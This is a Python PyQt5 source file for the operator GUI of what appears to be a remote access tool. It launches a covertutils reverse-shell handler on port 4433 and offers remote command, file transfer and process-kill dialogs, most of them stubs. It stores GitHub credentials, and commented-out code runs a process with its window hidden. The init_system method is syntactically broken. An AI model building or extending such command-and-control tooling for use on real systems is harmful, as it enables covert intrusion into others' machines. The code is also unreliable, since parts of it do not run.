# -*- coding: utf-8 -*-
import os
import sys
from subprocess import *

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from PyQt5 import QtGui
from PyQt5 import QtCore
from PyQt5.QtCore import QThreadPool, QProcess
from PyQt5.QtWidgets import *

from controller.ui import *
from controller.config import Config
from controller.logger import logger
from controller.multithread import Worker


class EmittingStream(QtCore.QObject):
    textWritten = QtCore.pyqtSignal(str)  # 定义一个发送str的信号

    def write(self, text):
        self.textWritten.emit(str(text))


class MainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(MainWindow, self).__init__(parent)
        self.setupUi(self)
        self.action_system_quit.triggered.connect(self.on_exit)
        self.action_system_restart.triggered.connect(self.on_restart)
        self.action_system_start.triggered.connect(self.on_start)
        self.action_cmd.triggered.connect(self.show_cmd)
        self.action_file.triggered.connect(self.show_file)
        self.action_process.triggered.connect(self.show_process)
        self.action_ctlSettings.triggered.connect(self.show_controller_settings)
        self.action_svrSettings.triggered.connect(self.show_server_settings)

        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.customContextMenuRequested.connect(self._right_menu)
        # sys.stdout = EmittingStream(textWritten=self.outputWritten)
        # sys.stderr = EmittingStream(textWritten=self.outputWritten)
        self.textEdit.setReadOnly(True)
        logger.info('[*] Load system config')
        self.conf = Config('system.ini')
        self.system = None
        self.thread_pool = QThreadPool()
        self.process = QProcess(self)
        self.process.readyRead.connect(self.data_ready)
        # self.process.started.connect(lambda: self.runButton.setEnabled(False))
        # self.process.finished.connect(lambda: self.runButton.setEnabled(True))

    def _right_menu(self, point):
        menu = QMenu()
        menu.addAction(self.action_file)
        menu.addAction(self.action_cmd)
        menu.addAction(self.action_process)
        menu.exec_(self.table.viewport().mapToGlobal(point))

    def outputWritten(self, text):
        cursor = self.textEdit.textCursor()
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.textEdit.setTextCursor(cursor)
        self.textEdit.ensureCursorVisible()

    def init_system(self):
        logger.info('[*] Init system')
        self.prog = os.join(os.path.dirname(__file__),
        print(self.conf['server'])

    def on_start(self):
        logger.info('[*] System start')
        self.init_system()
        self.process.start('python', ['/home/uuu/covertutils/examples/tcp_reverse_handler.py', '4433', 'pass'])

        # from subprocess import *
        # from subprocess import STARTUPINFO  # 对于python2.7需要单独引用STARTUPINFO
        # from server.connector import tcp_reverse_handler
        # import os
        # startupinfo = STARTUPINFO()
        # startupinfo.dwFlags |= STARTF_USESHOWWINDOW
        # startupinfo.wShowWindow = SW_HIDE
        # print(os.getcwd())
        # self.system = Popen(['cmd c:\\python27\\python.exe '+ os.getcwd() + '\\'+self.conf.get('controller', 'connector'),
        #                      self.conf.get('controller', 'port'), self.conf.get('controller', 'password')], stdin=PIPE,
        #                     stdout=PIPE, stderr=PIPE, shell=False, startupinfo=startupinfo)
        # w = Worker(Popen("cmd"))
        # w.signals.result.connect(get_result)
        # # self.system.wait()
        # out, err = self.system.communicate(b'whoami')
        # print(out.decode('gbk'))
        # print(err)
        # print('system start')
        # cmd = 'cmd /c c:/python27/python.exe ' + self.conf.get('controller', 'connector')
        # args = [self.conf.get('controller', 'port'), self.conf.get('controller', 'password')]
        # self.system = QProcess(self)
        # self.system.start('cmd /c dir', ['.'])
        # self.system.readyReadStandardOutput.connect(lambda: print(self.system.readAllStandardOutput()))
        # self.system.readyReadStandardError.connect(lambda: self.system.readAllStandardError())
        # print(self.system.communicate('help'))

    def callProgram(self):
        # run the process
        # `start` takes the exec and a list of arguments
        # self.process.start('ping', ['127.0.0.1'])
        self.process.start('python', ['/home/uuu/covertutils/examples/tcp_reverse_handler.py', '4433', 'pass'])


    def data_ready(self):
        cursor = self.textEdit.textCursor()
        cursor.movePosition(cursor.End)
        cursor.insertText(str(self.process.readAll(), encoding='utf-8'))
        self.textEdit.ensureCursorVisible()

    def on_restart(self):
        pass

    def on_exit(self):
        btn = QMessageBox.question(self, "退出", "是否确定退出？",
                                   QMessageBox.Ok | QMessageBox.Cancel)
        if btn == QMessageBox.Ok:
            qApp.quit()

    def show_cmd(self):
        cmd = DialogCmd(self)
        cmd.show()

    def show_file(self):
        file = DialogFile(self)
        file.show()

    def show_process(self):
        process = DialogProcess(self)
        process.show()

    def show_controller_settings(self):
        ctl = DialogCtlSettings(self, self.conf)
        ctl.show()

    def show_server_settings(self):
        svr = DialogSvrSettings(self, self.conf)
        svr.show()


class DialogFile(QDialog, Ui_File):
    def __init__(self, parent=None):
        super(DialogFile, self).__init__(parent)
        self.setupUi(self)
        self.setWindowTitle('File')

        self.treeView.customContextMenuRequested.connect(self.open_right_menu)
        self.action_upload.triggered.connect(self.upload_file)
        self.action_download.triggered.connect(self.download_file)

    def open_right_menu(self, po):
        popMenu = QMenu(self)
        popMenu.addAction(self.action_newfile)
        popMenu.addAction(self.action_newfolder)
        popMenu.addAction(self.action_upload)
        popMenu.addAction(self.action_download)
        popMenu.addSeparator()
        popMenu.addAction(self.action_refresh)
        popMenu.exec_(self.treeView.viewport().mapToGlobal(po))

    def new_file(self, fname='New Text.txt'):
        pass

    def new_folder(self, name='New Folder'):
        pass

    def upload_file(self):
        filename, _ = QFileDialog.getOpenFileName(self, "打开文件", "",
                                                  "All files (*.*)")
        print(filename)
        print(_)
        # with open(filename, 'r') as f:
        #     f.read()

    def download_file(self):
        savename, _ = QFileDialog.getSaveFileName(self, "保存文件", "", "All files (*.*)")
        print(savename)

    def refresh(self):
        pass


class DialogCmd(QDialog, Ui_Cmd):

    class EmittingStream(QtCore.QObject):
        textWritten = QtCore.pyqtSignal(str)  # 定义一个发送str的信号

        def write(self, text):
            self.textWritten.emit(str(text))

    def __init__(self, parent=None):
        super(DialogCmd, self).__init__(parent)
        self.setupUi(self)
        self.setWindowTitle('Cmd')
        # self.textEdit.setReadOnly(True)
        # 将输出重定向到textEdit中
        sys.stdout = self.EmittingStream(textWritten=self.outputWritten)
        sys.stderr = self.EmittingStream(textWritten=self.outputWritten)

    # 接收信号str的信号槽
    def outputWritten(self, text):
        cursor = self.textEdit.textCursor()
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.textEdit.setTextCursor(cursor)
        self.textEdit.ensureCursorVisible()


class DialogProcess(QDialog, Ui_Process):
    def __init__(self, parent=None):
        super(DialogProcess, self).__init__(parent)
        self.setupUi(self)
        self.setWindowTitle('Process Manager')
        self.listView.customContextMenuRequested.connect(self._right_menu)
        self.action_refresh.triggered.connect(self.on_refresh)
        self.action_kill.triggered.connect(self.on_kill)

    def _right_menu(self, point):
        menu = QMenu()
        menu.addAction(self.action_kill)
        menu.addSeparator()
        menu.addAction(self.action_refresh)
        menu.exec_(self.listView.viewport().mapToGlobal(point))

    def on_kill(self):
        print('kill process')

    def on_refresh(self):
        print('refresh process')


class DialogSvrSettings(QDialog, Ui_svrSettings):
    def __init__(self, parent=None, conf=None):
        super(DialogSvrSettings, self).__init__(parent)
        self.setupUi(self)
        self.setWindowTitle("Server Setting")
        if conf:
            self.url.setText(conf.get('server', 'config_url'))
        self.buttonBox.accepted.connect(lambda: self.save_settings(conf))

    def save_settings(self, conf):
        conf.set('server', 'config_url', self.url.text())
        conf.save()


class DialogCtlSettings(QDialog, Ui_ctlSettings):
    def __init__(self, parent=None, conf=None):
        super(DialogCtlSettings, self).__init__(parent)
        self.setupUi(self)
        self.setWindowTitle('Controller Setting')
        if conf:
            self.port.setText(conf.get('controller', 'port'))
            self.password.setText(conf.get('controller', 'password'))
            self.git_user.setText(conf.get('github', 'user'))
            self.git_pass.setText(conf.get('github', 'password'))
            self.token_full.setText(conf.get('github', 'token_full'))
            self.token_limit.setText(conf.get('github', 'token_limit'))
        self.buttonBox.accepted.connect(lambda: self.save_settings(conf))

    def save_settings(self, conf):
        conf.set('controller', 'port', self.port.text())
        conf.set('controller', 'password', self.password.text())
        conf.set('github', 'user', self.git_user.text())
        conf.set('github', 'password', self.git_pass.text())
        conf.set('github', 'token_full', self.token_full.text())
        conf.set('github', 'token_limit', self.token_limit.text())
        conf.save()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())
